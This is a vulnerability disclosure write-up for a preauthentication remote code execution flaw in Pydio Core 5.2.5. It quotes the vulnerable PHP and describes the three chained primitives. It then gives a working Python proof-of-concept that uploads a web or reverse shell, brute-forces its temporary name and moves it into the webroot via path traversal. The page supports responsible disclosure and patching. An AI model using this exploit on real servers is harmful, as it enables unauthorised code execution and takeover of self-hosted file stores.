@@ -1,0 +1,85 @@
+<!doctype html> <html lang=en > <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, initial-scale=1"> <link rel=stylesheet  href="/wednesday/libs/highlight/styles/base16/chalk.min.css" /> <link rel=stylesheet  href="/wednesday/css/franklin.css" /> <link rel=stylesheet  href="/wednesday/css/tufte.css" /> <link rel=stylesheet  href="/wednesday/css/latex.css" /> <link rel=stylesheet  href="/wednesday/css/adjust.css" /> <link rel=icon  href="/wednesday/assets/favicon.png" /> <title>Preauth RCE in Pydio Core 5.2.5</title> <div id=layout > <div id=menu > <ul> <li><a href="/wednesday/">home</a> <li><a href="/wednesday/about/">about</a> <li><a href="/wednesday/ctf/">ctf</a> <li><a href="/wednesday/research/">research</a> </ul> </div> <div id=main ></div> </div> <div class=franklin-content ><h1 id=preauth_rce_in_pydio_core_525 ><a href="#preauth_rce_in_pydio_core_525" class=header-anchor >Preauth RCE in Pydio Core 5.2.5</a></h1> <p><a href="https://github.com/pydio/pydio-core">Pydio Core</a> is an open-source platform for managing, sharing and synchronising files within a self-hosted environment. In addition to the core file sharing functionality, it provides plugins for alternative storage backends and authentication drivers.</p> <p>During an engagement at Mantel, I discovered a previously undocumented preauthentication RCE in Pydio Core 5.2.5. The application itself is quite old, so the impact here isn&#39;t particularly groundbreaking. The goal of this writeup is mainly to ensure the vulnerability can be found by search engines and other indexers.</p> <h4 id=preconditions_and_fingerprinting ><a href="#preconditions_and_fingerprinting" class=header-anchor >Preconditions and Fingerprinting</a></h4> <p>Unlike <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20718">CVE-2018-20718</a>, this vulnerability does not require that the attacker have prior knowledge of a public share link. Instead, the only precondition is that the Pydio instance is configured to use the file-backed serial configuration driver, as opposed to the database-backed driver.</p> <p>The use of this driver fingerprinted by making a GET request to <code>/index.php?action&#61;get_xml_registry</code> and searching for the following element in the application response:</p> <pre><code class="xml hljs"><span class=hljs-tag >&lt;<span class=hljs-name >confdriver</span> <span class=hljs-attr >name</span>=<span class=hljs-string >&quot;serial&quot;</span> <span class=hljs-attr >id</span>=<span class=hljs-string >&quot;conf.serial&quot;</span> <span class=hljs-attr >label</span>=<span class=hljs-string >&quot;Serialized Files&quot;</span>
+  <span class=hljs-attr >description</span>=<span class=hljs-string >&quot;Stores the conf data as serialized PHP values on the filesystem.&quot;</span>&gt;</span></code></pre> <h4 id=description ><a href="#description" class=header-anchor >Description</a></h4> <p>Exploitation of this vulnerability involves chaining three primitives in order to achieve an arbitrary write into the application&#39;s file system.</p> <h4 id=primitive_1_preauthentication_file_read_from_tmp ><a href="#primitive_1_preauthentication_file_read_from_tmp" class=header-anchor >Primitive 1: Preauthentication file read from <code>/tmp</code></a></h4> <p>Within <code>class.AbstractConfDriver.php</code> the <code>get_binary_param</code> and <code>get_global_binary_param</code> actions allow unauthenticated users to read data from a local file by passing a filename in the <code>tmp_file</code> parameter. Since the path is sanitised by <code>AJXP_Utils::securePath</code>, the read is constrained only to files in the <code>/tmp</code> directory.</p> <pre><code class="php hljs"><span class=hljs-keyword >case</span> <span class=hljs-string >&quot;get_binary_param&quot;</span> :
+  <span class=hljs-keyword >if</span> (<span class="hljs-title function_ invoke__">isSet</span>(<span class=hljs-variable >$httpVars</span>[<span class=hljs-string >&quot;tmp_file&quot;</span>])) {
+    <span class=hljs-variable >$file</span> = <span class="hljs-title class_">AJXP_Utils</span>::<span class="hljs-title function_ invoke__">getAjxpTmpDir</span>().<span class=hljs-string >&quot;/&quot;</span>.<span class="hljs-title class_">AJXP_Utils</span>::<span class="hljs-title function_ invoke__">securePath</span>(<span class=hljs-variable >$httpVars</span>[<span class=hljs-string >&quot;tmp_file&quot;</span>]);
+    <span class=hljs-keyword >if</span> (<span class="hljs-title function_ invoke__">isSet</span>(<span class=hljs-variable >$file</span>)) {
+      <span class="hljs-title function_ invoke__">header</span>(<span class=hljs-string >&quot;Content-Type:image/png&quot;</span>);
+      <span class="hljs-title function_ invoke__">readfile</span>(<span class=hljs-variable >$file</span>);
+    }
+  } <span class=hljs-keyword >else</span> <span class=hljs-keyword >if</span> (<span class="hljs-title function_ invoke__">isSet</span>(<span class=hljs-variable >$httpVars</span>[<span class=hljs-string >&quot;binary_id&quot;</span>])) {
+    ⋮
+  }
+  <span class=hljs-keyword >break</span>;</code></pre> <h4 id=primitive_2_preauthentication_file_write_into_tmp_with_constrained_filename ><a href="#primitive_2_preauthentication_file_write_into_tmp_with_constrained_filename" class=header-anchor >Primitive 2: Preauthentication file write into <code>/tmp</code> with constrained filename</a></h4> <p>Also within <code>class.AbstractConfDriver.php</code>, the <code>store_binary_temp</code> action allows unauthenticated users to upload arbitrary files into the <code>/tmp</code> directory. Although the extension of the upload is not modified, the filename of the upload is prefixed by six characters from an MD5 hash of the upload time. Since PHP resolves time at a second resolution, this does not provide enough entropy to prevent attackers from brute forcing the filename using the arbitrary read primitive above.</p> <pre><code class="php hljs"><span class=hljs-keyword >case</span> <span class=hljs-string >&quot;store_binary_temp&quot;</span> :
+  <span class=hljs-keyword >if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class=hljs-variable >$fileVars</span>)) {
+    <span class=hljs-variable >$keys</span> = <span class="hljs-title function_ invoke__">array_keys</span>(<span class=hljs-variable >$fileVars</span>);
+    <span class=hljs-variable >$boxData</span> = <span class=hljs-variable >$fileVars</span>[<span class=hljs-variable >$keys</span>[<span class=hljs-number >0</span>]];
+    <span class=hljs-variable >$err</span> = <span class="hljs-title class_">AJXP_Utils</span>::<span class="hljs-title function_ invoke__">parseFileDataErrors</span>(<span class=hljs-variable >$boxData</span>);
+    <span class=hljs-keyword >if</span> (<span class=hljs-variable >$err</span> != <span class=hljs-literal >null</span>) {
+
+    } <span class=hljs-keyword >else</span> {
+      <span class=hljs-variable >$rand</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>()), <span class=hljs-number >0</span>, <span class=hljs-number >6</span>);
+      <span class=hljs-variable >$tmp</span> = <span class=hljs-variable >$rand</span>.<span class=hljs-string >&quot;-&quot;</span>. <span class=hljs-variable >$boxData</span>[<span class=hljs-string >&quot;name&quot;</span>];
+      @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class=hljs-variable >$boxData</span>[<span class=hljs-string >&quot;tmp_name&quot;</span>], <span class="hljs-title class_">AJXP_Utils</span>::<span class="hljs-title function_ invoke__">getAjxpTmpDir</span>().<span class=hljs-string >&quot;/&quot;</span>. <span class=hljs-variable >$tmp</span>);
+    }
+  }</code></pre> <h4 id=primitive_3_arbitrary_local_file_move ><a href="#primitive_3_arbitrary_local_file_move" class=header-anchor >Primitive 3: Arbitrary local file move</a></h4> <p>Within <code>class.AJXP_Utils.php</code>, the <code>parseStandardFormParameters</code> function parses and coalesces multiple HTTP request formats into a common structure. As a side-effect of this parsing, when the datatype of a paramter is specified as <code>binary</code>, <code>parseStandardFormParameters</code> calls <code>saveBinary</code> in order to persist the specified temporary file in the application&#39;s binary store.</p> <pre><code class="php hljs">⋮
+<span class=hljs-keyword >else</span> <span class=hljs-keyword >if</span> (<span class=hljs-variable >$type</span> == <span class=hljs-string >&quot;binary&quot;</span> &amp;&amp; <span class=hljs-variable >$binariesContext</span> !== <span class=hljs-literal >null</span>) {
+  <span class=hljs-keyword >if</span> (!<span class=hljs-keyword >empty</span>(<span class=hljs-variable >$value</span>)) {
+    ⋮
+    } <span class=hljs-keyword >else</span> {
+      <span class=hljs-variable >$file</span> = <span class="hljs-title class_">AJXP_Utils</span>::<span class="hljs-title function_ invoke__">getAjxpTmpDir</span>().<span class=hljs-string >&quot;/&quot;</span>.<span class=hljs-variable >$value</span>;
+      <span class=hljs-keyword >if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class=hljs-variable >$file</span>)) {
+        <span class=hljs-variable >$id</span>= !<span class=hljs-keyword >empty</span>(<span class=hljs-variable >$repDef</span>[<span class=hljs-variable >$key</span>.<span class=hljs-string >&quot;_original_binary&quot;</span>]) ? <span class=hljs-variable >$repDef</span>[<span class=hljs-variable >$key</span>.<span class=hljs-string >&quot;_original_binary&quot;</span>] : <span class=hljs-literal >null</span>;
+        <span class=hljs-variable >$id</span>=<span class="hljs-title class_">ConfService</span>::<span class="hljs-title function_ invoke__">getConfStorageImpl</span>()-&gt;<span class="hljs-title function_ invoke__">saveBinary</span>(<span class=hljs-variable >$binariesContext</span>, <span class=hljs-variable >$file</span>, <span class=hljs-variable >$id</span>);
+        <span class=hljs-variable >$value</span> = <span class=hljs-variable >$id</span>;
+      }
+    }
+}</code></pre> <p>Since neither <code>&#36;file</code> nor <code>&#36;id</code> are sanitised against path traversal, this enables unauthenticated attackers to move files to and from arbitrary locations within the application&#39;s filesystem. By moving a webshell into a location under the application&#39;s webroot, we can then achieve code execution.</p> <h4 id=proof_of_concept ><a href="#proof_of_concept" class=header-anchor >Proof of Concept</a></h4> <p>Below is a proof-of-concept script for exploiting the remote code execution vulnerability in Pydio Core. </p> <p><code>shell.php</code> can be any PHP web shell or reverse shell. For example, one may use the <a href="https://github.com/pentestmonkey/php-reverse-shell"><code>pentestmonkey</code> reverse shell</a>.</p> <pre><code class="py hljs"><span class=hljs-comment >#!/usr/bin/env python3</span>
+
+<span class=hljs-keyword >import</span> requests
+<span class=hljs-keyword >from</span> time <span class=hljs-keyword >import</span> time
+<span class=hljs-keyword >from</span> hashlib <span class=hljs-keyword >import</span> md5
+<span class=hljs-keyword >import</span> base64
+<span class=hljs-keyword >import</span> os
+<span class=hljs-keyword >import</span> urllib3
+
+host = ...
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">main</span>():
+    server_name = local_name = <span class=hljs-string >&quot;shell.php&quot;</span>
+
+    <span class=hljs-comment ># store the file in /tmp</span>
+    timestamp = <span class=hljs-built_in >int</span>(time())
+    r = requests.post(
+        <span class=hljs-string >f&quot;<span class=hljs-subst >{host}</span>/index.php?action=store_binary_temp&quot;</span>,
+        files={<span class=hljs-string >&quot;file&quot;</span>: (server_name, <span class=hljs-built_in >open</span>(local_name, <span class=hljs-string >&quot;rb&quot;</span>), <span class=hljs-string >&quot;application/text&quot;</span>)},
+    )
+
+    <span class=hljs-comment ># brute force the time hash to find the filename</span>
+    prefix = <span class=hljs-literal >None</span>
+    <span class=hljs-keyword >for</span> stamp <span class=hljs-keyword >in</span> <span class=hljs-built_in >range</span>(timestamp - <span class=hljs-number >5</span>, timestamp + <span class=hljs-number >5</span>):
+        prefix = md5(<span class=hljs-built_in >str</span>(stamp).encode()).hexdigest()[:<span class=hljs-number >6</span>]
+        r = requests.get(
+            <span class=hljs-string >f&quot;<span class=hljs-subst >{host}</span>/index.php?action=get_binary_param&quot;</span>,
+            params={<span class=hljs-string >&quot;tmp_file&quot;</span>: <span class=hljs-string >f&quot;<span class=hljs-subst >{prefix}</span>-<span class=hljs-subst >{server_name}</span>&quot;</span>},
+        )
+        <span class=hljs-keyword >if</span> <span class=hljs-string >&quot;No such file or directory&quot;</span> <span class=hljs-keyword >not</span> <span class=hljs-keyword >in</span> r.text:
+            <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;found&quot;</span>, prefix)
+            <span class=hljs-keyword >break</span>
+
+    <span class=hljs-comment ># move the file into a public location</span>
+    data = {
+        <span class=hljs-string >&quot;PREFERENCES_foo&quot;</span>: <span class=hljs-string >f&quot;<span class=hljs-subst >{prefix}</span>-<span class=hljs-subst >{server_name}</span>&quot;</span>,
+        <span class=hljs-string >&quot;PREFERENCES_foo_ajxptype&quot;</span>: <span class=hljs-string >&quot;binary&quot;</span>,
+        <span class=hljs-string >&quot;PREFERENCES_foo_original_binary&quot;</span>: <span class=hljs-string >f&quot;../../../../../public/<span class=hljs-subst >{local_name}</span>&quot;</span>,
+    }
+    r = requests.post(
+        <span class=hljs-string >f&quot;<span class=hljs-subst >{host}</span>/index.php?action=custom_data_edit&quot;</span>,
+        data=data,
+    )
+
+    requests.get(
+        <span class=hljs-string >f&quot;<span class=hljs-subst >{host}</span>/data/plugins/conf.serial/binaries/users/shared/shell.php&quot;</span>,
+    )
+
+<span class=hljs-keyword >if</span> __name__ == <span class=hljs-string >&quot;__main__&quot;</span>:
+    main()</code></pre> <h4 id=mitigations ><a href="#mitigations" class=header-anchor >Mitigations</a></h4> <p>Pydio Core reached end of life on December 31st, 2019, and is no longer maintained or supported. Its successor, Pydio Cells, is a complete rewrite in Go that introduces a modern microservice-based architecture designed for better scalability, reliability, and integration with contemporary infrastructure. Migration is recommended mitigate this vulnerability as well as to benefit from active development, security updates, and new capabilities.</p> <h4 id=timeline ><a href="#timeline" class=header-anchor >Timeline</a></h4> <ul> <li><p>23 July 2025: Initial disclosure to Pydio</p> <li><p>28 July 2025: Permission to publish granted</p> </ul> </div> </div> </div> <script src="/wednesday/libs/highlight/highlight.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script> <script src="/wednesday/libs/highlight/rust.min.js"></script> <script src="/wednesday/libs/highlight/csharp.min.js"></script> <script> hljs.highlightAll(); hljs.configure({ tabReplace: " " }); </script>
